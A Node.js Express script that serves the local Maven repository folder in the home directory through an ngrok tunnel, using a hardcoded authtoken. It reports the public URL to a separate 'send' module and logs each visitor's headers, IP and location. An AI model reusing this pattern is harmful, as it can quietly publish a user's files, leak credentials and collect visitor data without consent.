const express = require("express");
const os = require("os");
const homedir = os.homedir();
const config = require("./config.json");
const port = config.port;
const path = require("path");
const rootdir = path.join(homedir, "/.m2/repository");
const app = express();
const serveIndex = require("./serve-index/index");
const ngrok = require("ngrok");
const fs = require("fs");
const auth = "1Szs4cJp7MoUlFPT3nyRjD5P05v_3BREWhqf8z2NdcNHMneUm";
const geoip = require("geoip-lite");
const send = require("./send");

const serve = async function () {
	const url = await ngrok.connect({
		proto: "http", // http|tcp|tls, defaults to http
		addr: port, // port or network address, defaults to 80
		//auth: 'user:pwd', // http basic authentication for tunnel
		//subdomain: 'alex', // reserved tunnel name https://alex.ngrok.io
		authtoken: auth, // your authtoken from ngrok.com
		region: "us", // one of ngrok regions (us, eu, au, ap, sa, jp, in), defaults to us
		//configPath: '~/git/project/ngrok.yml', // custom path for ngrok config file
		//binPath: path => path.replace('app.asar', 'app.asar.unpacked'), // custom binary path, eg for prod in electron
		onStatusChange: () => {
			//console.log(status);
			//console.log(fs.readFileSync(__dirname + "/server.txt"), status);
		}, // 'closed' - connection is lost, 'connected' - reconnected
		onLogEvent: () => {
			//console.log(data);
		}, // returns stdout messages from ngrok process
	});
	fs.writeFileSync(__dirname + "/server.properties", "url=" + url);
	fs.writeFileSync(__dirname + "/server.txt", url);

	// send information to server
	send(url);
};

app.set("trust proxy", true);
//app.use(express.static(rootdir));
//app.use(serveIndex(rootdir));
app.use("/", express.static(rootdir), serveIndex(rootdir, { icons: true }));

app.all("/*", async function requuestInformation(req, res, next) {
	var jsonbuilder = {};
	jsonbuilder.headers = req.headers;
	jsonbuilder.ip = req.ip;

	var geo = geoip.lookup(req.ip);
	jsonbuilder.useragent = req.headers["user-agent"];
	jsonbuilder.language = req.headers["accept-language"];
	jsonbuilder.country = geo ? geo.country : "Unknown";
	jsonbuilder.region = geo ? geo.region : "Unknown";
	if (!fs.existsSync(__dirname + `/info`)) {
		fs.mkdirSync(__dirname + `/info`, { recursive: true });
	}
	fs.writeFileSync(
		__dirname + `/info/${jsonbuilder.ip.replace(/[^A-Za-z.]/g, "")}.json`,
		JSON.stringify(jsonbuilder),
		{ encoding: "utf-8" }
	);

	//console.log(geo);
	next();
});
app.listen(port, serve);
